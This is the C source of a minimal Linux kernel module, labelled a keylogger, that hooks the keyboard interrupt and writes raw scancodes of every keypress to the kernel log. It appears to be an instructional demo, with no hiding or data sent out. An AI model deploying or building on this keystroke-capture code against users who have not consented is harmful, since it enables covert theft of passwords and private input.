#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <asm/io.h>

int const keylogger = 0; // Just to use its addres as dev_id

// This function services keyboard interrupts.
irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs) {
	static unsigned char scancode;

	scancode = inb(0x60); // Read keyboard status getting scancode from specific input port.

	if((scancode == 0x01) || (scancode == 0x81)) {
		printk ("\nYou pressed Esc !\n");
	} else {
		printk("Not mapped key!\n");
		printk("Key was: %d\n\n", scancode);
	}

	return (irq_handler_t) IRQ_HANDLED;
}

void __exit irq_cleanup(void) {
	printk(KERN_ALERT "Stopping keylogger...\n");
	free_irq(1, (void *)(&keylogger));
}

// Initialize the module − register the IRQ handler
int init_module() {
	// Request IRQ 1, the keyboard IRQ, to go to our irq_handler IRQF_SHARED means we're willing to have other handlers on this IRQ.
	printk(KERN_ALERT "Keylogger started");

	return request_irq(1, (irq_handler_t) irq_handler, IRQF_SHARED, "keylogger", (void *)(&keylogger));
}

module_exit(irq_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
